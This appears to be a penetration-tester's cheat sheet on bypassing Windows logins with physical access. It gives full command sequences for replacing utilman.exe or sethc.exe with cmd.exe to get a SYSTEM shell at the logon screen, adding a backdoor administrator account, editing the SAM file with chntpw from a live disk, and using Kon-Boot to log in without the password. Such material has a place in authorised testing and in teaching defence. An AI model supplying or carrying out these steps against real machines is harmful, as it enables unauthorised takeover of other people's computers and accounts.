# ⭕ Physical Attack

## <mark style="color:red;">Sticky Keys + Binary Replacement</mark>

If we can boot from a live USB and access the windows file system indirectly, it is possible to replace some of the binaries responsible for "sticky key" actions such as:

* <mark style="color:green;">**SETHC:**</mark> _sethc.exe_ is invoked when SHIFT is pressed 5 times
* <mark style="color:green;">****</mark>[<mark style="color:green;">**UTILMAN:**</mark>](https://infinitelogins.com/2020/01/13/how-to-sign-into-any-windows-machine-when-you-have-physical-access/) _Utilman.exe_ is invoked by pressing WINDOWS+U
* <mark style="color:green;">**OSK:**</mark> _osk.exe_ is invoked by pressing WINDOWS+U, then launching the on-screen keyboard
* <mark style="color:green;">**DISP:**</mark> _DisplaySwitch.exe_ is invoked by pressing WINDOWS+P

These binaries are located inside _**`C:\Windows\System32`**_`.`we can **change** any of them for a **copy** of the binary **cmd.exe** (also in the same folder) and any time that you invoke any of those binaries a command prompt as **SYSTEM** will appear at the login screen.

```tsconfig
# You can access a SYSTEM cmd shell if you have access to the filesystem
# utilman.exe can be run BEFORE login by "WinKey + U"
# If you can access filesystem and change utilman.exe by a cmd.exe, SYSTEM shell will be run.

# Access can be done by live bootable key (Linux, Windows..)
# From a Windows 10 bootable key -> SHIFT + F10 to access filesystem
move d:\windows\system32\utilman.exe d:\windows\system32\utilman.exe.bak
copy d:\windows\system32\cmd.exe d:\windows\system32\utilman.exe

# OR 

C:\
cd windows\system32
ren utilman.exe utilman.exe.bak
copy cmd.exe utilman.exe

# Then on the logon screen --> WinKey + U
# And then
net user NewGuy abc123 /add
net localgroup Administrators NewGuy /add
# Reverting
# To restore utilman.exe, in the Command Prompt type in:
C:
cd windows\system32
del utilman.exe
```

## <mark style="color:red;">Modifying SAM</mark>

We can use the tool _**chntpw**_ to **modify the** _**SAM**_ **file** of a mounted Windows filesystem. Then, you could change the password of the Administrator user, for example. this tool is available in Kali Linux.

boot from a live disk and mount the windows installation partition (usually the C drive):

```tsconfig
# in case chntpw is not present in your distro
apt-get install chntpw ntfs-3g

# mount C drive
mount -t ntfs /dev/sda2 /mnt
```

change directory to:

```tsconfig
cd /mnt/WINDOWS/system32/config
```

list available users:

```tsconfig
chntpw -l SAM
```

Select User:

```tsconfig
chntpw -u <$USERNAME> SAM 
```

Select an Option from the Menu.

Unmount Windows Partition & Reboot.

{% hint style="warning" %}
This technique wont work on a windows 10  system if the PIN protection is also activated.
{% endhint %}

## <mark style="color:red;">Kon-Boot</mark>

**Kon-Boot** is one of the best tools around which can log you into Windows without knowing the password. It works by **hooking into the system BIOS and temporarily changing the contents of the Windows kernel** while booting (new versions work also with **UEFI**). It then allows you to enter **anything as the password** during login. The next time you start the computer without Kon-Boot, the original password will be back, the temporary changes will be discarded and the system will behave as if nothing has happened.

{% embed url="https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/" %}

It is a live CD/USB that can **patch the memory** so you **won't need to know the password to login**.\
Kon-Boot also performs the **StickyKeys** trick so you could press _**Shift**_ **5 times to get an Administrator cmd**.
